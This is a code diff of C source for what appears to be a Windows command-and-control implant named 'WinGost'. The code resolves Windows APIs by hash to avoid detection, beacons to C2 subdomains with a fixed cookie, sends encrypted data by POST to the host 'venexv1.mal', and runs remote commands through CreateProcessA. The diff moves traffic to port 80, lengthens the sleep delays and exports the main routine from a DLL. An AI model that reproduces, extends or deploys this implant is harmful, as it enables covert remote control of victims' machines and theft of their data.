@@ -1,4 +1,4 @@
-#include "WinGost.h"
+#include "..\includes\WinGost.h"
 
 
 char namesoffunc[20];
@@ -294,9 +294,9 @@ BOOL c2BeaconCommunicate(wchar_t* domain, PFUNCTION_TABLE ft){
 
     if (!hSession || !hConnect || !hRequest) {return FALSE;}
 
-    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"Cookie: 12E4A4FF050EB700\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
+    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"Cookie: 12E4A4FF050EB900\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
     if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {return FALSE;}
-    !ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
+    ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
 
     BYTE buffer[4096];  // Fixed buffer
     BYTE* buffer_ptr = buffer;
@@ -357,9 +357,14 @@ void gostSend(char* message, int message_len, const wchar_t* apiID, PFUNCTION_TA
 
     // Send encrypted message to C2 server Using WinHTTP POST request
     HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"venexv1.mal", 5000, 0);
+    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"venexv1.mal", 80, 0);
     HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"POST", apiID, NULL, NULL, NULL, 0);
-    ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, message, message_len, message_len, 0);
+
+    if (!hSession || !hConnect || !hRequest) {return;}
+
+    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"Cookie: 12E4A4FF050EB900\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return;}
+    if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, message, message_len, message_len, 0)) {return;}
+
     ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
 
     ft->WinHttp.WinHttpCloseHandle(hRequest);
@@ -459,9 +464,9 @@ BOOL gostExecute(char* command, char* output, DWORD outputSize, PFUNCTION_TABLE 
 }
 
 
-void __main(void) {
+__declspec(dllexport) void __main(void) {
 
-    derectSleep(FALSE,20);
+    derectSleep(FALSE,300);
 
 
     // Initialize function table
@@ -481,7 +486,7 @@ void __main(void) {
     functionTable.Kernel32.VirtualAlloc = getFunctionBase(0x9C7BFF01, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualAlloc"
     functionTable.Kernel32.VirtualFree = getFunctionBase(0x81C26E14, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualFree"
     functionTable.Kernel32.GetProcessHeap = getFunctionBase(0x7460A5C2, kernel32Base); // hash of "KERNEL32.DLL" + "ProcessHeap"
-    functionTable.Kernel32.Sleep = getFunctionBase(0xF78728AE, kernel32Base); // hash of "KERNEL32.DLL" + "Sleep"
+    //functionTable.Kernel32.Sleep = getFunctionBase(0xF78728AE, kernel32Base); // hash of "KERNEL32.DLL" + "Sleep"
     functionTable.Kernel32.CreateProcessA = getFunctionBase(0x98975766, kernel32Base); // hash of "KERNEL32.DLL" + "CreateProcessA"
 
     functionTable.Kernel32.CreatePipe = getFunctionBase(0x23E967FD, kernel32Base); // hash of "KERNEL32.DLL" + "CreatePipe"
@@ -515,6 +520,7 @@ void __main(void) {
     functionTable.WinGost.gostSend = gostSend; // assign gostSend function
     functionTable.WinGost.gostPrint = gostPrint; // assign gostPrint function
     functionTable.WinGost.gostExecute = gostExecute; // assign gostExecute function
+    functionTable.WinGost.gostSleep = derectSleep; // assign derectSleep function
 
     // Test the resolved functions
     PFUNCTION_TABLE ft = &functionTable;
@@ -527,7 +533,7 @@ void __main(void) {
     while (1)
     {
         
-        derectSleep(FALSE, 5); // Sleep for 5 seconds before next beacon
+        derectSleep(FALSE, 30); // Sleep for 5 seconds before next beacon
 
         if(c2BeaconCommunicate(subdomains[i], ft)){
             continue;
